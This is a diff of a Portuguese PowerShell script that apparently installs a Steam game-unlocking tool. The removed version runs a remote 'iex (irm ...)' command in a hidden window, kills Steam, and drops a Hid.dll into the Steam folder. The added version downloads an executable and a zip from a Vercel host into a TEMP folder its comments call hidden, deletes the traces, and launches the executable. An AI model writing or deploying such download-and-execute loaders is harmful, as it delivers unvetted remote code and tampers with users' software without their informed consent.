@@ -1,138 +1,54 @@
-$ErrorActionPreference = "Stop"
+# ==========================================
+# Configurações do Script
+# ==========================================
 
-# Cria pasta temporaria invisivel
-$tempDir = "$env:TEMP\SteamLivreSetup"
-if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir }
-New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
+# Substitua pela URL base do seu projeto na Vercel
+$baseUrl = "https://pack27k.vercel.app"
 
-Write-Host "=================================================" -ForegroundColor Cyan
-Write-Host "       INICIANDO INSTALADOR STEAMLIVRE" -ForegroundColor Cyan
-Write-Host "=================================================" -ForegroundColor Cyan
-Write-Host "Baixando arquivos necessarios da nuvem. Aguarde..." -ForegroundColor Yellow
+# Pasta oculta no computador do usuário onde tudo vai acontecer
+$pastaDestino = "$env:TEMP\MeuPrograma"
 
-# =========================================================
-# MUDE O LINK ABAIXO PARA O SEU SITE REAL DO VERCEL
-# =========================================================
-$baseUrl = "https://SEU_SITE.vercel.app"
+# Nomes exatos dos seus arquivos
+$nomeExe = "adicionar.exe"
+$nomeZip = "config.zip"
 
-$urlZip = "$baseUrl/STEAMLIVRE.zip"
-$url7zExe = "$baseUrl/7z.exe"
-$url7zDll = "$baseUrl/7z.dll"
+# ==========================================
+# Preparando o terreno
+# ==========================================
 
-try {
-    Invoke-WebRequest -Uri $urlZip -OutFile "$tempDir\STEAMLIVRE.zip" -UseBasicParsing
-    Invoke-WebRequest -Uri $url7zExe -OutFile "$tempDir\7z.exe" -UseBasicParsing
-    Invoke-WebRequest -Uri $url7zDll -OutFile "$tempDir\7z.dll" -UseBasicParsing
-} catch {
-    Write-Host "Erro ao baixar os arquivos da internet. Verifique sua conexao ou os links." -ForegroundColor Red
-    Start-Sleep -Seconds 5
-    Exit
+Write-Host "Preparando ambiente..." -ForegroundColor Cyan
+
+# Cria a pasta principal onde tudo será salvo, caso não exista
+if (-Not (Test-Path $pastaDestino)) {
+    New-Item -ItemType Directory -Path $pastaDestino | Out-Null
 }
 
-# Cria o .BAT do instalador
-$batCode = @'
-@echo off
-setlocal EnableDelayedExpansion
-chcp 65001 >nul
-title instagram @steamlivre
-mode con: cols=100 lines=38
+# ==========================================
+# Baixando os arquivos
+# ==========================================
 
-cd /d "%~dp0"
+Write-Host "Baixando o Executável (adicionar.exe)..." -ForegroundColor Cyan
+$caminhoExe = "$pastaDestino\$nomeExe"
+Invoke-WebRequest -Uri "$baseUrl/$nomeExe" -OutFile $caminhoExe
 
-set "ARQUIVO_ZIP=STEAMLIVRE.zip"
-set "EXTRATOR=7z.exe"
-set "SENHA_ZIP=40028922"
-set "URL_AGRADECIMENTO=https://agradecimentopmw.lovable.app"
+Write-Host "Baixando as configurações (config.zip)..." -ForegroundColor Cyan
+$caminhoZip = "$pastaDestino\$nomeZip"
+Invoke-WebRequest -Uri "$baseUrl/$nomeZip" -OutFile $caminhoZip
 
-call :Header
-echo.
-echo  [INFO] Buscando diretorio da Steam...
+# ==========================================
+# Extração e Limpeza
+# ==========================================
 
-for /f "tokens=3*" %%A in ('reg query "HKCU\Software\Valve\Steam" /v SteamExe 2^>nul') do set "steamExe=%%A %%B"
-for %%A in ("%steamExe%") do set "steamDir=%%~dpA"
-set "steamDir=%steamDir:~0,-1%"
-set "configDir=%steamDir%\config"
+Write-Host "Extraindo pasta de configurações..." -ForegroundColor Cyan
+# Extrai o conteúdo do config.zip na mesma pasta onde está o adicionar.exe
+Expand-Archive -Path $caminhoZip -DestinationPath $pastaDestino -Force
 
-call :Header
-echo.
-echo  [+] Preparando instalacao...
-echo.
-echo  [#####               ] 25%%
-powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
-timeout /t 2 /nobreak >nul
+# Apaga o arquivo config.zip original para limpar o PC do usuário
+Remove-Item -Path $caminhoZip -Force
 
-call :Header
-echo.
-echo  [+] Configurando ambiente...
-echo.
-echo  [##########          ] 50%%
-powershell -WindowStyle Hidden -Command "iex (irm https://steam.run) *>$null"
-powershell -Command "Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force"
-timeout /t 2 /nobreak >nul
+# ==========================================
+# Execução
+# ==========================================
 
-call :Header
-echo.
-echo  [+] Extraindo arquivos...
-echo.
-echo  [###############     ] 75%%
-if exist "%temp%\sl_temp" rmdir /s /q "%temp%\sl_temp"
-mkdir "%temp%\sl_temp"
-"%EXTRATOR%" x "%ARQUIVO_ZIP%" -p%SENHA_ZIP% -y -o"%temp%\sl_temp" -bso0 -bsp0 >nul
-timeout /t 2 /nobreak >nul
-
-call :Header
-echo.
-echo  [+] Aplicando configuracoes...
-echo.
-echo  [##################  ] 90%%
-xcopy /e /i /y "%temp%\sl_temp\Config\*" "%configDir%\" >nul 2>&1
-copy /y "%temp%\sl_temp\Hid.dll" "%steamDir%\" >nul 2>&1
-rmdir /s /q "%temp%\sl_temp" >nul
-start "" "%steamExe%"
-timeout /t 2 /nobreak >nul
-
-call :Header
-echo.
-echo  [+] Instalacao Concluida!
-echo.
-echo  [####################] 100%%
-timeout /t 2 /nobreak >nul
-start "" "%URL_AGRADECIMENTO%"
-
-call :Header
-color 0A
-echo.
-echo ========================================================
-echo         INSTALACAO STEAMLIVRE FINALIZADA!
-echo ========================================================
-echo.
-echo  Muito obrigado por utilizar nossos servicos.
-echo.
-echo  Pressione qualquer tecla para fechar o instalador...
-pause >nul
-exit /b
-
-:Header
-cls
-color 0B
-echo.
-echo.
-echo     _^|_^|_^|  _^|_^|_^|_^|_^|  _^|_^|_^|_^|    _^|_^|    _^|      _^|  
-echo   _^|            _^|      _^|        _^|    _^|  _^|_^|  _^|_^|  
-echo     _^|_^|        _^|      _^|_^|_^|    _^|_^|_^|_^|  _^|  _^|  _^|  
-echo         _^|      _^|      _^|        _^|    _^|  _^|      _^|  
-echo   _^|_^|_^|        _^|      _^|_^|_^|_^|  _^|    _^|  _^|      _^|  
-echo.
-echo    S  T  E  A  M    L  I  V  R  E
-echo   ==================================================
-echo         ^>^>^> nos siga no instagram @steamlivre ^<^<^<
-echo.
-exit /b
-'@
-
-Set-Content -Path "$tempDir\instalador.bat" -Value $batCode -Encoding UTF8
-
-# Executa o BAT e limpa a sujeira depois
-Write-Host "Abrindo tela de instalacao..." -ForegroundColor Green
-Start-Process -FilePath "$tempDir\instalador.bat" -Wait
-Remove-Item -Recurse -Force $tempDir
+Write-Host "Iniciando o programa..." -ForegroundColor Green
+Start-Process -FilePath $caminhoExe
